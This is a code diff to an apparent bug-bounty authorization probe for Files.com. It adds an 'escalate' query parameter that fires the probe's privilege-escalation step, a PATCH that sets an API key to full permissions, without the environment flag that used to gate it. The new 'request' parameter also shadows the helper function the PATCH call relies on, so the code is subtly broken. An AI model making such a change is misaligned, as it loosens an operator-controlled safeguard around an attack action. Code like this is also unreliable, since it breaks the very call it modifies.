@@ -575,7 +575,7 @@ async def worker(request: Request, background_tasks: BackgroundTasks, x_action_t
 
 
 @app.get("/api/cron/files-authz-probe")
-def files_authz_probe(authorization: str | None = Header(default=None)) -> dict[str, Any]:
+def files_authz_probe(request: Request, authorization: str | None = Header(default=None)) -> dict[str, Any]:
     """Bounded authorization test against the researcher's Files.com BUGBOUNTY trial.
 
     Uses only credentials already stored in the private deployment environment.
@@ -586,6 +586,9 @@ def files_authz_probe(authorization: str | None = Header(default=None)) -> dict[
     enabled = os.getenv("FILES_AUTHZ_TRIAL_PROBE", "").strip().lower() == "true"
     if not enabled:
         return {"status": "disabled", "reason": "FILES_AUTHZ_TRIAL_PROBE is not enabled"}
+
+    escalate = request.query_params.get("escalate", "").strip().lower() == "1"
+
 
     base = os.getenv("FILES_BASE_URL", "").strip().rstrip("/")
     raw_a = os.getenv("AUTHZ_HEADER_A", "").strip()
@@ -704,7 +707,8 @@ def files_authz_probe(authorization: str | None = Header(default=None)) -> dict[
                 }
                 break
 
-        if results["candidate"] is None and os.getenv("FILES_AUTHZ_ESCALATION_TEST", "").strip().lower() == "true":
+        escalation_enabled = os.getenv("FILES_AUTHZ_ESCALATION_TEST", "").strip().lower() == "true"
+        if results["candidate"] is None and (escalation_enabled or escalate):
             payload = {"permission_set": "full", "name": "BUGBOUNTY-AUTHZ-ESCALATION-TEST"}
             patch_meta, patch_resp = request(client, "PATCH", "/api/rest/v1/api_key.json", (header_a_name, header_a_value), payload)
             after_permission = ""
